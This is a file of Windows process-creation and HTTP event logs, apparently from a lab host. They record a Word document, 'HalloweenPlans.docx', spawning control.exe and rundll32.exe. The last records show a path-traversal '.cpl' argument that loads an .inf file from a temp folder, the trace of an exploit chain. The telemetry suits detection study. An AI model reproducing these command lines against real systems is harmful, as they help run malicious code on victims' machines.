{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:37","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:37","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":"/filestreamingservice/files/4b88ad87-4200-403f-94ba-65a52397d537?P1=1631725459&P2=404&P3=2&P4=ZE99EOm%2bXjaNnwsaJTzcLadWHPH3tdztDjw7zG6bGdyaEue3ZuUw4O0BJGHJlqHbYLC68CcOx40B1ACAioV85w%3d%3d","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"http","winlog.computer_name":null,"perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":"/filestreamingservice/files/4b88ad87-4200-403f-94ba-65a52397d537?P1=1631725459&P2=404&P3=2&P4=ZE99EOm%2bXjaNnwsaJTzcLadWHPH3tdztDjw7zG6bGdyaEue3ZuUw4O0BJGHJlqHbYLC68CcOx40B1ACAioV85w%3d%3d","tls.sni":null,"winlog.task":null,"registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:38","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:38","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:39","winlog.event_data.CommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../AppData/Local/Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\Admin\\Downloads\\HalloweenPlans.docx\" /o \"\"","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:39","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\control.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"C:\\Windows\\system32\\RunDll32.exe Shell32.dll,Control_RunDLL \".cpl:123\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:123\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\System32\\rundll32.exe","powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":null}
{"timestamp":"2021-09-15T16:38:40","winlog.event_data.CommandLine":"\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \".cpl:../../../AppData/Local/Temp/Low/msword.inf\",","winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":"C:\\Windows\\SysWOW64\\control.exe \".cpl:../../../AppData/Local/Temp/Low/msword.inf\",","event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:38:40","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Process Create (rule: ProcessCreate)","registry.key":null,"winlog.event_data.Image":"C:\\Windows\\SysWOW64\\rundll32.exe","powershell.file.script_block_text":null}
